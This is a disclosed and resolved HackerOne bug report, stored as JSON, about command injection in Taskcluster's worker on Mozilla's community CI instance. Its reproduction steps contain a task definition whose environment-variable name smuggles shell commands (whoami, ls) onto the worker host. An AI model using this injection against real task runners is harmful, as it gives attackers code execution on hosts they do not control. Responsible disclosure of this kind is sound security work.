{
  "id": 2221404,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMjIxNDA0",
  "url": "https://hackerone.com/reports/2221404",
  "title": "RCE on worker host due to unsanitized \"env\" variable name in task definition on community-tc.services.mozilla.com",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2023-10-23T08:54:29.237Z",
  "submitted_at": "2023-10-23T08:54:29.452Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "ebrietas",
    "url": "/ebrietas",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/020/235/f0a8477c33580e48c0a7371a25431f08adf50ad6_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 61236,
    "url": "https://hackerone.com/mozilla",
    "handle": "mozilla",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/0p8e6gg8xoy45dhjxs5wh4iti6k8/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/0p8e6gg8xoy45dhjxs5wh4iti6k8/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Mozilla",
      "twitter_handle": "",
      "website": "https://www.mozilla.org",
      "about": "Mozilla web bug bounty program specific to encouraging security research in Mozilla's products and web services."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2024-12-08T11:04:29.792Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2024-11-08T11:04:28.882Z",
  "comments_closed?": true,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\nThis issue affects Taskcluster's worker code and not  just this instance but I did not see an easy way to report the vulnerability as well since I was unsure if this would qualify for the  Mozilla Client bug bounty. The task cluster definition attempts to escape parameters that are passed to the podman command prior to running the container to execute the task, the custom shell.escape function (https://github.com/taskcluster/shell/blob/master/shell.go)  is quite robust and is used on most user supplied parameters including docker image name, commands to run , and artifact path which prevents trivial command execution however it is not applied on the environment variable name itself allowing for command execution on the worker host.  Additionally, the community-tc.services.mozilla.com instance allows for any valid user to utilize an example worker group which allows for RCE on the worker host.\n\n\n## Steps To Reproduce:\n\n1. Create a github account if you do not have one and then login to https://community-tc.services.mozilla.com/ \n2. Visit https://community-tc.services.mozilla.com/tasks/create to create a new task. Copy and paste the following definition and then click the green save icon to run your task:\n```yaml\nretries: 0\ncreated: '2023-10-23T08:10:11.044Z'\ndeadline: '2023-10-23T11:10:11.044Z'\nexpires: '2024-10-23T11:10:11.044Z'\ntaskQueueId: proj-misc/tutorial\nprojectId: none\ntags: {}\nscopes: []\npayload:\n  env:\n# Commands to run in here\n    test2 --help ; whoami ; ls -lah ;: '--help'\n  image: ubuntu:latest\n  command:\n    - /bin/bash\n    - '-c'\n    - 'echo hello'\n  maxRunTime: 5000\nextra: {}\nmetadata:\n  name: example-task\n  description: An **example** task\n  owner: name@example.com\n  source: https://community-tc.services.mozilla.com/tasks/create\nschedulerId: taskcluster-ui\n```\n\n{F2795414}\n\n3. \nWait for your task to run (it should fail) and then view the live logs to check for the output of the commands. \n{F2795415}\n\n## Impact\n\n## Summary:\nCommand execution outside of the intended container for the worker.",
  "bounty_amount": "500.0",
  "formatted_bounty": "$500",
  "weakness": {
    "id": 70,
    "name": "Code Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 2795414,
      "file_name": "chrome_GivgBsaNU7.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/7u0wz9az1qmvtregjh3a8k2mhxry?response-content-disposition=attachment%3B%20filename%3D%22chrome_GivgBsaNU7.png%22%3B%20filename%2A%3DUTF-8%27%27chrome_GivgBsaNU7.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5GAZNKGJ%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T174648Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJIMEYCIQDQZyUwQvouLyaRtGnPRrf%2F35cfkXKcZNb5j7%2Fd7vwmpAIhANaFDEDexrx9TqJLxVveDxeUe7Dory5zAJ9qfTfN84l2KroFCPD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igy0Nr5Nlyi%2Bdsu5kbAqjgWcr9zOIckrgW71D1B8hM0372QJsy62Y6RfuPTAGsSeun%2BwhPAUtgkckhJRY19GdLXZt%2F425VbJY%2BmUQ08gF2Y3LxT2Mu1i20tGjlHTJ1lMFGdmBEH8ybNjhdaq9XJTdtqsM7kSylehSItsyGpf8NRv3nKIhV%2FlSt0reO1EwPIb%2B7d9OQ%2FG0T0OTNpD6ZlHutfVDyKYgEUyjEqnWOkgLG%2BWou7%2FRnJZnb3RK5NgKDB4sjSJ1YByqHFUSZjGpr8o0b%2Bifuwz%2FyvozQm6XnuLecPYGMP2bCkl5YqPhgkEh%2Bp1kCbhW9a5iRChhsGii6kMYGr2T9grfi8Xp9v5%2BBZuwWjzN2v8Ko28oUOdECMIK1L5oRD8TiuHSQ3%2BOu4mt4BsMxTIZN0LewULPMegS4zmVulbhSVnMPHRqI%2Br3xxF8LMUgVeZ05NZHtGr6ip1KoV%2FSSFjgvgQFtoN7%2BjG4NxkD8Vd3jFcPrMUnyoXp9Q878DUsvsVhiJemz3aLTlcCxfn3cSG8cEEh5ibZavZbYzfurAHZ30hIoVipjJaohcY0fQR%2BXrohZCBLKQws6vjPXE8u0wLL4wCq9Hz%2BlTwd0yGfr9R26SvdHGHTNFHG8MsDezaHB3B3rnHov9O9zu1XFERYCfDX7WPOemtCF59UZJn4r51UWW1okvbtCkKiHdiBsQUqUsNbYHikleGaHZq2z%2FASAwqruUtoyARMrf1vRwIILG2EDDvtkW%2F8aHXie5PEsNcZhpu1Iin73G3ybsupAsxx%2F0QctD05C6g18fDYch0YGuzZDXWOftgoHbJNezLHk%2BLxsQxetPL36mGaELWbouuBs4zNT6SDqxt15fU8ZK1TRyh%2FISTY7wkPuat4G7LdnAwpIe7xgY6sAHVl0Ve6%2BvLZAm2lz26ZWDwHHTQO09VTdXW5uVgOtsh%2BeUa4B0tKnao7btRC4t5KzpXK52Zxx8utyTRKe7Nb6JGlVejXAAIkNyXoLyrfa4IuDHBH7YO77TSTR8pYVxsgiHZ4cZ6pkioTmysM0gmRGLZjBFaQ7rhyA6m40gScPZTGyQkebB6TrTb%2FZO%2BnTC8%2Bs7pCOcCNxsKQH3NQK9Ue4FTBbD9ikW9enGCewMNFtK5OA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=58c6d6dd0374d01cb6283e209e79e0db4c769acf2ee9e00d855065d160880f7e",
      "file_size": 221550,
      "type": "image/png",
      "moderated": false
    },
    {
      "id": 2795415,
      "file_name": "chrome_i6h61NCU3s.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/fkthkm0nywdc4lj1ty4h94u4aer8?response-content-disposition=attachment%3B%20filename%3D%22chrome_i6h61NCU3s.png%22%3B%20filename%2A%3DUTF-8%27%27chrome_i6h61NCU3s.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5GAZNKGJ%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T174648Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJIMEYCIQDQZyUwQvouLyaRtGnPRrf%2F35cfkXKcZNb5j7%2Fd7vwmpAIhANaFDEDexrx9TqJLxVveDxeUe7Dory5zAJ9qfTfN84l2KroFCPD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igy0Nr5Nlyi%2Bdsu5kbAqjgWcr9zOIckrgW71D1B8hM0372QJsy62Y6RfuPTAGsSeun%2BwhPAUtgkckhJRY19GdLXZt%2F425VbJY%2BmUQ08gF2Y3LxT2Mu1i20tGjlHTJ1lMFGdmBEH8ybNjhdaq9XJTdtqsM7kSylehSItsyGpf8NRv3nKIhV%2FlSt0reO1EwPIb%2B7d9OQ%2FG0T0OTNpD6ZlHutfVDyKYgEUyjEqnWOkgLG%2BWou7%2FRnJZnb3RK5NgKDB4sjSJ1YByqHFUSZjGpr8o0b%2Bifuwz%2FyvozQm6XnuLecPYGMP2bCkl5YqPhgkEh%2Bp1kCbhW9a5iRChhsGii6kMYGr2T9grfi8Xp9v5%2BBZuwWjzN2v8Ko28oUOdECMIK1L5oRD8TiuHSQ3%2BOu4mt4BsMxTIZN0LewULPMegS4zmVulbhSVnMPHRqI%2Br3xxF8LMUgVeZ05NZHtGr6ip1KoV%2FSSFjgvgQFtoN7%2BjG4NxkD8Vd3jFcPrMUnyoXp9Q878DUsvsVhiJemz3aLTlcCxfn3cSG8cEEh5ibZavZbYzfurAHZ30hIoVipjJaohcY0fQR%2BXrohZCBLKQws6vjPXE8u0wLL4wCq9Hz%2BlTwd0yGfr9R26SvdHGHTNFHG8MsDezaHB3B3rnHov9O9zu1XFERYCfDX7WPOemtCF59UZJn4r51UWW1okvbtCkKiHdiBsQUqUsNbYHikleGaHZq2z%2FASAwqruUtoyARMrf1vRwIILG2EDDvtkW%2F8aHXie5PEsNcZhpu1Iin73G3ybsupAsxx%2F0QctD05C6g18fDYch0YGuzZDXWOftgoHbJNezLHk%2BLxsQxetPL36mGaELWbouuBs4zNT6SDqxt15fU8ZK1TRyh%2FISTY7wkPuat4G7LdnAwpIe7xgY6sAHVl0Ve6%2BvLZAm2lz26ZWDwHHTQO09VTdXW5uVgOtsh%2BeUa4B0tKnao7btRC4t5KzpXK52Zxx8utyTRKe7Nb6JGlVejXAAIkNyXoLyrfa4IuDHBH7YO77TSTR8pYVxsgiHZ4cZ6pkioTmysM0gmRGLZjBFaQ7rhyA6m40gScPZTGyQkebB6TrTb%2FZO%2BnTC8%2Bs7pCOcCNxsKQH3NQK9Ue4FTBbD9ikW9enGCewMNFtK5OA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e4662b4c892d5de7f7eaca422328dcb749fca49e01dccae15f88b639dcff75b7",
      "file_size": 272479,
      "type": "image/png",
      "moderated": false
    }
  ],
  "allow_singular_disclosure_at": "2024-12-08T11:04:29.463Z",
  "allow_singular_disclosure_after": -24734538.844514124,
  "singular_disclosure_allowed": true,
  "vote_count": 54,
  "voters": [
    "orange303",
    "mr-medi",
    "roland_hack",
    "zy9ard3",
    "2026",
    "thalaivar304",
    "spaghettisec",
    "masonhck357",
    "jackhavoltrey",
    "naysec_",
    "and 44 more..."
  ],
  "severity": {
    "rating": "low",
    "author_type": "Team"
  },
  "structured_scope": {
    "databaseId": 434005,
    "asset_type": "URL",
    "asset_identifier": "community-tc.services.mozilla.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
